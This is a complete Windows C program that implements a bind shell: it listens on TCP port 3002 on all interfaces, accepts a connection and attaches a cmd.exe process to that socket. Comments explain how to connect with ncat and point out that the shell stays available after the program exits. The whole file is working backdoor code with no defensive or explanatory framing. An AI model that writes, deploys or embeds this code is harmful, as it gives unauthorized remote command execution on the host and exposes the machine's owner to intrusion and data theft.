#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <tchar.h>

#pragma comment(lib, "ws2_32.lib")

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance,
                      _In_ LPWSTR lpCmdLine,
                      _In_ int nCmdShow)
{
	// To test this you can ncat -v 127.0.0.1 3002
	WSADATA wsa;
	struct sockaddr_in address;
	STARTUPINFO sui = {0};
	PROCESS_INFORMATION pi = {0};

	int result = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (result != 0)
		return EXIT_FAILURE;

	// const SOCKET server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	// WSASocketW works, socket() won't
	const SOCKET server_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL,
	                                        (unsigned int)NULL);

	if (server_socket == INVALID_SOCKET)
	{
		WSACleanup();
		return EXIT_FAILURE;
	}

	address.sin_family = AF_INET;
	address.sin_addr.s_addr = htonl(INADDR_ANY);
	// If you have an actual address then use, i.e 127.0.0.1:
	// InetPton(AF_INET, _T("127.0.0.1"), &address.sin_addr.s_addr);

	address.sin_port = htons(3002);

	result = bind(server_socket, (struct sockaddr*)&address, sizeof(SOCKADDR));

	if (result == SOCKET_ERROR)
	{
		closesocket(server_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	result = listen(server_socket, SOMAXCONN);
	if (result == SOCKET_ERROR)
	{
		closesocket(server_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	ADDRINFO client_address;
	int client_address_len = sizeof(struct sockaddr_in);

	const SOCKET client_socket = accept(server_socket, (SOCKADDR*)& client_address, &client_address_len);
	if (client_socket == INVALID_SOCKET)
	{
		closesocket(server_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	// sui.wShowWindow = SW_HIDE; // Not needed
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = (HANDLE)client_socket;
	sui.hStdOutput = (HANDLE)client_socket;
	sui.hStdError = (HANDLE)client_socket;

	TCHAR cmd[] = _T("cmd.exe");
	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE,
	                  CREATE_NEW_CONSOLE, NULL, NULL, &sui, &pi))
	{
		return EXIT_FAILURE;
	}

	// If you don't want to exit this app then you can wait the cmd to finish
		// but this is not needed, even if this app exits, the shell will be still opened on the client
		// WaitForSingleObject(pi.hProcess, INFINITE);
	// It does not matter to close the socket handles, the shell will be still available on the client
	closesocket(server_socket);
	closesocket(client_socket);
	return EXIT_SUCCESS;
}
